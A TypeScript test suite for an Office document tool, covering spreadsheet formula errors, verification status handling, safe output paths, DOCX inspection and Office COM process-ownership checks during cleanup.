    expect(coverage.samples[0]).toMatchObject({
      sheet: "Formulas",
      cell: "A1",
      formula: "1/0",
      cached: true,
      result: "#DIV/0!",
    });
    expect(coverage.samples[1]).toMatchObject({
      sheet: "Formulas",
      cell: "A2",
      formula: "SEQUENCE(2)",
      cached: true,
      result: "#SPILL!",
    });
    const inspection = await executeOfficeDocument(
      { operation: "inspect", path: "formula-errors.xlsx" },
      new Map([["formula-errors.xlsx", source]]),
    );
    expect(inspection.output).toContain("错误值：2");
  });

  it("derives authoritative verification states for export and recalculation outcomes", () => {
    expect(
      deriveOfficeVerification({
        officeStatus: "verified",
        render: "verified",
        recalculation: "not_requested",
        structuralPartial: false,
      }),
    ).toEqual({
      status: "verified",
      render: "verified",
      recalculation: "not_requested",
    });
    expect(
      deriveOfficeVerification({
        officeStatus: "verified",
        render: "verified",
        recalculation: "partial",
        structuralPartial: false,
      }),
    ).toEqual({
      status: "partial",
      render: "verified",
      recalculation: "partial",
    });
    expect(
      deriveOfficeVerification({
        officeStatus: "verified",
        render: "failed",
        recalculation: "failed",
        structuralPartial: false,
      }).status,
    ).toBe("failed");
    expect(
      deriveOfficeVerification({
        officeStatus: "unavailable",
        render: "unavailable",
        recalculation: "unavailable",
        structuralPartial: false,
      }).status,
    ).toBe("unavailable");
  });

  it("fails closed when Office COM omits or contradicts its authoritative JSON status", () => {
    expect(
      interpretOfficeComProcessResult({
        code: 0,
        stdout: '{"event":"office-stage","stage":"completed"}',
        stderr: "",
      }).status,
    ).toBe("failed");
    expect(
      interpretOfficeComProcessResult({
        code: 0,
        stdout: '{"message":"completed"}',
        stderr: "",
      }).status,
    ).toBe("failed");
    expect(
      interpretOfficeComProcessResult({
        code: 1,
        stdout: '{"status":"verified","message":"reported success"}',
        stderr: "",
      }).status,
    ).toBe("failed");
    expect(
      interpretOfficeComProcessResult({
        code: 0,
        stdout: '{"status":"unknown","message":"unexpected state"}',
        stderr: "",
      }).status,
    ).toBe("failed");
    expect(
      interpretOfficeComProcessResult({
        code: 0,
        stdout: '{"status":"unavailable","message":"Office is blocked"}',
        stderr: "",
      }),
    ).toEqual({ status: "unavailable", message: "Office is blocked" });
    expect(
      interpretOfficeComProcessResult({
        code: 0,
        stdout: '{"status":"verified","message":"verified"}',
        stderr: "",
      }),
    ).toEqual({ status: "verified", message: "verified" });
  });

  it("requires explicit verify output paths and rejects unsafe overwrite targets", () => {
    const parsed = officeDocumentSchema.parse({
      operation: "verify",
      path: "report.xlsx",
      render: true,
      recalculate: true,
      render_path: "report.pdf",
      output_path: "report-recalculated.xlsx",
    });
    expect(() => assertOfficeInputExtensions(parsed)).not.toThrow();
    expect(() =>
      officeDocumentSchema.parse({
        operation: "verify",
        path: "report.docx",
        render: true,
        render_path: "report.pdf",
        output_path: "report-recalculated.xlsx",
      }),
    ).toThrow("output_path 需要 recalculate:true");
    expect(() =>
      assertOfficeInputExtensions(
        officeDocumentSchema.parse({
          operation: "verify",
          path: "report.xlsx",
          render: true,
          recalculate: true,
          render_path: "report.docx",
        }),
      ),
    ).toThrow("render_path 必须使用 .pdf");
    expect(() =>
      assertOfficeInputExtensions(
        officeDocumentSchema.parse({
          operation: "verify",
          path: "report.xlsx",
          render: true,
          recalculate: true,
          output_path: "report.xlsx",
        }),
      ),
    ).toThrow("output_path 不能覆盖");
  });

  it("inspects DOCX structure and returns the source SHA used by controlled edits", async () => {
    const source = await authorOfficeDocument(
      documentAuthoringSchema.parse({
        path: "inspect.docx",
        blocks: [
          { type: "heading", level: 1, text: "Office report" },
          { type: "paragraph", text: "Editable body text" },
        ],
      }),
      new Map(),
    );
    const result = await executeOfficeDocument(
      { operation: "inspect", path: "inspect.docx" },
      new Map([["inspect.docx", source]]),
    );
    expect(result.output).toContain("DOCX 结构");
    expect(result.output).toContain(`Source SHA-256: ${hash(source)}`);
    expect(result.output).toContain("Editable body text");
    expect(result.output).toContain('"replace_text":true');
    expect(result.warnings.join("\n")).toContain("源 SHA-256");
  });

  it("accepts only the exact recorded Office Automation process identity", () => {
    const owner = parseOfficeProcessOwner(
      JSON.stringify({
        pid: 4321,
        name: "EXCEL.EXE",
        executablePath: "C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE",
        creationTimeUtc: "2026-11-17T09:20:10.1234567Z",
        commandLine:
          '"C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE" /automation -Embedding',
      }),
    );
    expect(owner).not.toBeNull();
    if (!owner) throw new Error("Expected a valid Office process owner.");
    expect(officeProcessOwnerMatches(owner, owner)).toBe(true);
    expect(officeProcessOwnerMatches(owner, { ...owner, pid: 4322 })).toBe(false);
    expect(officeProcessOwnerMatches(owner, { ...owner, name: "WINWORD.EXE" })).toBe(false);
    expect(
      officeProcessOwnerMatches(owner, {
        ...owner,
        creationTimeUtc: "2026-11-17T09:20:11.1234567Z",
      }),
    ).toBe(false);
    expect(
      officeProcessOwnerMatches(owner, {
        ...owner,
        commandLine:
          '"C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE" workbook.xlsx',
      }),
    ).toBe(false);
    expect(parseOfficeProcessOwner('{"pid":"not-a-number"}')).toBeNull();
  });

  it.skipIf(process.platform !== "win32")(
    "does not stop a process when the pidfile identity is not an Office automation instance",
    async () => {
      const root = await mkdtemp(join(tmpdir(), "mingshen-office-owner-test-"));
      const powershell = join(
        process.env.SystemRoot ?? "C:\\Windows",
        "System32",
        "WindowsPowerShell",
        "v1.0",
        "powershell.exe",
      );
      const script = join(process.cwd(), "resources", "documents", "office-com-verify.ps1");
      const pidFile = join(root, "office-owner.json");
      const dummy = spawn(
        powershell,
        ["-NoProfile", "-NonInteractive", "-Command", "Start-Sleep -Seconds 30"],
        { windowsHide: true, stdio: "ignore" },
      );
      try {
        if (!dummy.pid) throw new Error("Test fixture process did not start.");
        await writeFile(
          pidFile,
          JSON.stringify({
            pid: dummy.pid,
            name: "EXCEL.EXE",
            executablePath: powershell,
            creationTimeUtc: new Date().toISOString(),
            commandLine: `"${powershell}" -NoProfile /Automation -Embedding`,
          }),
        );
        const { stdout } = await execFileAsync(
          powershell,
          [
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            script,
            "-Cleanup",
            "-CleanupPidFile",
            pidFile,
          ],
          { timeout: 10_000, windowsHide: true },
        );
        const final = stdout.trim().split(/\r?\n/).at(-1);
        expect(JSON.parse(final ?? "{}")).toMatchObject({ status: "ownership-mismatch" });
        expect(() => process.kill(dummy.pid as number, 0)).not.toThrow();
      } finally {
        if (dummy.pid && !dummy.killed) dummy.kill();
        await rm(root, { recursive: true, force: true });
      }
    },
    15_000,
  );

  it.skipIf(process.platform !== "win32")(
    "propagates Office verification cancellation instead of returning a degraded success",
    async () => {
      const controller = new AbortController();
      controller.abort(new Error("test-office-cancelled"));
      await expect(
        verifyWithMicrosoftOffice(
          await workbookBytes(),
          "cancelled.xlsx",
          5_000,
          controller.signal,
          false,
          true,
        ),
      ).rejects.toThrow("test-office-cancelled");
    },
  );

  it.runIf(process.platform === "win32" && process.env.MINGSHEN_RUN_WORD_COM_TEST === "1")(
    "renders an authored DOCX with Word COM without changing the source bytes",
    async () => {
      const source = await authorOfficeDocument(
        documentAuthoringSchema.parse({
          path: "manual-word.docx",
          title: "Word COM verification",
          blocks: [
            { type: "heading", level: 1, text: "Word COM verification" },
            {
              type: "paragraph",
              text: "Offline generated document for the optional Microsoft Word rendering diagnostic.",
            },
          ],
        }),
        new Map(),
      );
      const original = Buffer.from(source);
      const originalHash = hash(source);
      const result = await verifyWithMicrosoftOffice(
        source,
        "manual-word.docx",
        15_000,
        undefined,
        true,
        false,
      ).catch((error) => {
        console.error(
          `[Word COM receipt]\n${JSON.stringify(
            {
              status: "threw",
              message: formatOfficeComDiagnostic(
                error instanceof Error ? error.message : String(error),
                null,
              ),
              sourceUnchanged: hash(source) === originalHash && source.equals(original),
            },
            null,
            2,
          )}`,
        );
        throw error;
      });
      const pdf = result.renderedPdf;
      const pdfHeader = pdf?.subarray(0, 5).toString("ascii") ?? "";
      const sourceUnchanged = hash(source) === originalHash && source.equals(original);
      const receipt = {
        status: result.status,
        message: result.message,
        pdfBytes: pdf?.length ?? 0,
        pdfHeader,
        sourceUnchanged,
      };
      if (result.status !== "verified" || pdfHeader !== "%PDF-" || !sourceUnchanged) {
        console.error(`[Word COM receipt]\n${JSON.stringify(receipt, null, 2)}`);
      }
      expect(result.status).toBe("verified");
      expect(pdf).toBeDefined();
      expect(pdf?.length).toBeGreaterThan(100);
      expect(pdfHeader).toBe("%PDF-");
      expect(sourceUnchanged).toBe(true);
    },
    40_000,
  );

  it.runIf(process.platform === "win32" && process.env.MINGSHEN_RUN_OFFICE_COM_TEST === "1")(
    "recalculates an isolated workbook and leaves no owned Office instance behind",
    async () => {
      const sourceWorkbook = new ExcelJS.Workbook();
      const sheet = sourceWorkbook.addWorksheet("Calc");
      sheet.getCell("A1").value = 2;
      sheet.getCell("B1").value = 3;
      sheet.getCell("C1").value = { formula: "A1+B1", result: 999 };
      const source = Buffer.from(await sourceWorkbook.xlsx.writeBuffer());
      const result = await verifyWithMicrosoftOffice(
        source,
        "formula.xlsx",
        60_000,
        undefined,
        false,
        true,
      );
      expect(result.status).toBe("verified");
      expect(result.recalculatedBytes).toBeDefined();
      const recalculated = new ExcelJS.Workbook();
      await recalculated.xlsx.load(
        result.recalculatedBytes as unknown as Parameters<typeof recalculated.xlsx.load>[0],
      );
      expect(recalculated.getWorksheet("Calc")?.getCell("C1").result).toBe(5);
    },
    60_000,
  );

  it.runIf(process.platform === "win32" && process.env.MINGSHEN_RUN_OFFICE_COM_TEST === "1")(
    "reports the outer Office deadline without depending on application startup time",
    async () => {
      // The verifier adds a five-second process-cleanup grace period. Supplying a
      // negative logical deadline reduces the outer process timer to zero without
      // waiting for Excel to launch or changing the production timeout policy.
      const result = await verifyWithMicrosoftOffice(
        await workbookBytes(),
        "timeout.xlsx",
        -5_000,
        undefined,
        false,
        true,
      );
      expect(result.status).toBe("failed");
      expect(result.message).toContain("限定时间");
      expect(result.renderedPdf).toBeUndefined();
      expect(result.recalculatedBytes).toBeUndefined();
    },
    10_000,
  );

  it("exposes only source/read paths for gateway preloading", () => {
    expect(
      officeDocumentAssets({
        operation: "edit_presentation",
        path: "out.pptx",
        overwrite: false,
        source: { path: "in.pptx", expected_sha256: "0".repeat(64) },
        operations: [
          {
            type: "replace_notes_text",
            slide: 1,
            old_text: "old",
            new_text: "new",
          },
        ],
      }),
    ).toEqual(["in.pptx"]);
    expect(
      officeDocumentSourcePath({
        operation: "edit_spreadsheet",
        path: "out.xlsx",
        overwrite: false,
        source: { path: "in.xlsx", expected_sha256: "0".repeat(64) },
        operations: [{ type: "add_sheet", name: "New" }],
      }),
    ).toBe("in.xlsx");
  });
});
